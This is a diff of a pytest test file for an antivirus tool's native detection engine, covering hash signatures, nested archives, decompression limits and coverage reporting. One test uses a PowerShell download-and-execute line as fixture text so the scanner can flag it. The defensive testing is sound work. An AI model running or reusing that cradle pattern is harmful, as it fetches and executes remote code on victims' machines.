@@ -1,136 +1,145 @@
-"""Offline regressions for the opt-in AntiOS unified scan mode."""
+"""Regression tests for the independent AntiOS detection engine."""
 from __future__ import annotations
 
 import hashlib
+import io
 import json
 import tracemalloc
+import zipfile
 
-import pytest
-
-from antios import antivirus
-from antios.clamav import ScanOutcome
-from antios.unified_engine import UnifiedScanner
+from antios import antivirus, engine
+from antios.engine import AntiOSEngine
 
 
-class FakeClamAV:
-    metadata = {"version": "ClamAV test", "database_freshness": "current"}
-
-    def __init__(self, **_kwargs):
-        self.closed = False
-
-    def scan(self, content, _name):
-        if b"clam-threat" in content:
-            return ScanOutcome("threat", "Inert ClamAV fixture")
-        if b"clam-review" in content:
-            return ScanOutcome("review", "Inert review fixture")
-        return ScanOutcome()
-
-    def scan_stream(self, chunks):
-        for _ in chunks:
-            pass
-        return ScanOutcome()
-
-    def close(self):
-        self.closed = True
+def _archive(entries, *, compression=zipfile.ZIP_DEFLATED):
+    memory = io.BytesIO()
+    with zipfile.ZipFile(memory, "w", compression=compression) as archive:
+        for name, payload in entries.items():
+            archive.writestr(name, payload)
+    return memory.getvalue()
 
 
-class FakeAMSI:
-    def scan(self, content, _name):
-        return 32768 if b"amsi-threat" in content else 0
+def test_native_mode_scans_without_clamav_or_amsi(tmp_path, monkeypatch):
+    def external_provider_forbidden(*_args, **_kwargs):
+        raise AssertionError("Native engine must not call third-party providers")
 
-    def close(self):
-        pass
+    monkeypatch.setattr(antivirus, "ClamAVScanner", external_provider_forbidden)
+    monkeypatch.setattr(antivirus, "AmsiScanner", external_provider_forbidden)
+    target = tmp_path / "benign"
+    target.write_bytes(b"ordinary inert data")
+    result = antivirus.scan_files(target, engine="antios")
+    assert result["engine"]["provider"] == "AntiOS native"
+    assert result["engine"]["database_freshness"] == "local"
+    assert result["coverage"] == "antios-local-inspection"
+    assert result["verdict"] == "no-threats-found"
 
 
-def scanner(*, use_amsi=True, clamav_factory=FakeClamAV, amsi_factory=FakeAMSI):
-    return UnifiedScanner(
-        clamav_factory=clamav_factory,
-        amsi_factory=amsi_factory,
-        use_amsi=use_amsi,
-    )
-
-
-def test_unified_scan_merges_provider_findings_without_writing_to_file(tmp_path):
+def test_known_local_signature_is_confirmed_without_external_providers(tmp_path):
     target = tmp_path / "fixture"
-    target.write_bytes(b"clam-review amsi-threat")
+    target.write_bytes(b"known inert local signature")
+    digest = hashlib.sha256(target.read_bytes()).hexdigest()
+    database = tmp_path / "signatures.json"
+    database.write_text(json.dumps({
+        "schema": 1, "sha256": {digest: "Inert test signature"},
+    }))
+    result = antivirus.scan_files(target, engine="antios", signature_path=database)
+    assert result["verdict"] == "threats-found"
+    assert result["summary"]["threats"] == 1
+    assert result["findings"][0]["name"] == "Inert test signature"
+    assert result["findings"][0]["sha256"] == digest
+
+
+def test_known_signature_inside_zip_is_detected_and_archive_unchanged(tmp_path):
+    payload = b"inert archive signature fixture"
+    target = tmp_path / "archive.zip"
+    target.write_bytes(_archive({"folder/payload.bin": payload}))
     original = target.read_bytes(), target.stat().st_mtime_ns
-    result = antivirus.scan_files(
-        target, engine="antios", provider_factory=scanner, use_cache=False
-    )
-    assert result["verdict"] == "threats-found"
-    assert result["coverage"] == "antios-unified-and-signatures"
-    assert result["findings"][0]["engine"] == "Windows AMSI"
-    assert result["summary"]["provider_scanned"] == 1
-    assert (target.read_bytes(), target.stat().st_mtime_ns) == original
-
-
-def test_unified_clean_needs_all_required_providers(tmp_path):
-    target = tmp_path / "safe.txt"
-    target.write_bytes(b"benign fixture")
-    complete = antivirus.scan_files(target, engine="antios", provider_factory=scanner)
-    assert complete["verdict"] == "no-threats-found"
-
-    def missing_amsi():
-        raise OSError("not installed")
-
-    incomplete = antivirus.scan_files(
-        target, engine="antios",
-        provider_factory=lambda: scanner(amsi_factory=missing_amsi),
-    )
-    assert incomplete["verdict"] == "incomplete"
-    assert incomplete["coverage"] == "limited"
-    assert incomplete["engine"]["components"]["amsi"] is False
-
-
-def test_unified_keeps_amsi_detection_when_clamav_fails(tmp_path):
-    class BrokenClam(FakeClamAV):
-        def scan(self, _content, _name):
-            raise OSError("deliberate provider failure")
-
-    target = tmp_path / "suspicious"
-    target.write_bytes(b"amsi-threat")
-    result = antivirus.scan_files(
-        target, engine="antios",
-        provider_factory=lambda: scanner(clamav_factory=BrokenClam),
-    )
-    assert result["verdict"] == "threats-found"
-    assert result["coverage"] == "limited"
-    assert result["findings"][0]["engine"] == "Windows AMSI"
-    assert result["summary"]["errors"] == 1
-
-
-def test_stream_only_coverage_is_not_misreported_as_full():
-    mixed = scanner(use_amsi=True)
-    assert not mixed.scan_stream([b"arbitrary bytes"]).complete
-    mixed.close()
-    clam_only = scanner(use_amsi=False)
-    assert clam_only.scan_stream([b"arbitrary bytes"]).complete
-    clam_only.close()
-
-
-def test_local_sha256_remains_a_detection_source(tmp_path):
-    target = tmp_path / "local-fixture"
-    target.write_bytes(b"inert signature fixture")
     database = tmp_path / "signatures.json"
     database.write_text(json.dumps({
         "schema": 1,
-        "sha256": {hashlib.sha256(target.read_bytes()).hexdigest(): "Local signature"},
+        "sha256": {hashlib.sha256(payload).hexdigest(): "Archive signature fixture"},
     }))
-    result = antivirus.scan_files(
-        target, engine="antios", signature_path=database,
-        provider_factory=scanner,
-    )
-    assert result["findings"][0]["engine"] == "SHA-256"
+    result = antivirus.scan_files(target, engine="antios", signature_path=database)
+    assert result["verdict"] == "threats-found"
+    assert result["findings"][0]["engine"] == "AntiOS native"
+    assert result["findings"][0]["name"] == "Archive signature fixture"
+    assert (target.read_bytes(), target.stat().st_mtime_ns) == original
 
 
-def test_small_file_does_not_allocate_entire_read_limit(tmp_path):
+def test_nested_archive_signature_finds_member(tmp_path):
+    payload = b"inert nested archive fixture"
+    inner = _archive({"inside.exe": payload})
+    target = tmp_path / "outer.zip"
+    target.write_bytes(_archive({"nested.zip": inner}))
+    database = tmp_path / "signatures.json"
+    database.write_text(json.dumps({
+        "schema": 1,
+        "sha256": {hashlib.sha256(payload).hexdigest(): "Nested signature"},
+    }))
+    result = antivirus.scan_files(target, engine="antios", signature_path=database)
+    assert result["verdict"] == "threats-found"
+    assert result["findings"][0]["name"] == "Nested signature"
+
+
+def test_suspicious_script_is_review_only_and_not_auto_enforceable(tmp_path):
+    from antios.risk import evaluate_risk
+
+    target = tmp_path / "test.ps1"
+    target.write_bytes(b"invoke-expression (new-object net.webclient).downloadstring('example')")
+    result = antivirus.scan_files(target, engine="antios")
+    assert result["verdict"] == "review"
+    assert result["findings"][0]["kind"] == "review"
+    assert result["findings"][0]["engine"] == "AntiOS native"
+    risk = evaluate_risk(str(target), result)
+    assert not risk.automatic_enforcement_eligible
+
+
+def test_unreadable_zip_does_not_report_clean(tmp_path):
+    target = tmp_path / "damaged.zip"
+    target.write_bytes(b"PK\\x03\\x04corrupt")
+    result = antivirus.scan_files(target, engine="antios")
+    assert result["verdict"] == "review"
+    assert result["coverage"] == "limited"
+    assert result["findings"][0]["kind"] == "review"
+
+
+def test_archive_decompression_budget_is_bounded(tmp_path, monkeypatch):
+    monkeypatch.setattr(engine, "MAX_ARCHIVE_MEMBER_BYTES", 10)
+    target = tmp_path / "oversized.zip"
+    target.write_bytes(_archive({"oversize.txt": b"x" * 100}))
+    result = antivirus.scan_files(target, engine="antios")
+    assert result["verdict"] == "review"
+    assert result["coverage"] == "limited"
+
+
+def test_large_stream_inspection_does_not_pretend_full_coverage(tmp_path):
+    target = tmp_path / "large.bin"
+    with target.open("wb") as stream:
+        stream.truncate(33 * 1024 * 1024)
+    result = antivirus.scan_files(target, engine="antios")
+    assert result["summary"]["files_scanned"] == 1
+    assert result["coverage"] == "limited"
+    assert result["verdict"] == "incomplete"
+
+
+def test_small_file_read_is_bounded_by_actual_size(tmp_path):
     target = tmp_path / "tiny"
     target.write_bytes(b"x" * 1024)
     tracemalloc.start()
     try:
-        payload, _info = antivirus.read_regular(target, 64 * 1024 * 1024)
+        content, _info = antivirus.read_regular(target, 64 * 1024 * 1024)
         _current, peak = tracemalloc.get_traced_memory()
     finally:
         tracemalloc.stop()
-    assert len(payload) == 1024
+    assert len(content) == 1024
     assert peak < 8 * 1024 * 1024
+
+
+def test_native_engine_standalone_and_stream_boundary():
+    native = AntiOSEngine(signatures={
+        hashlib.sha256(b"fixture").hexdigest(): "Standalone fixture",
+    })
+    assert native.scan(b"fixture", "fixture.txt").kind == "threat"
+    assert native.scan(b"ordinary", "ordinary.txt").kind is None
+    assert not native.scan_stream([b"x" * (1024 * 1024 + 1)]).complete
+    native.close()
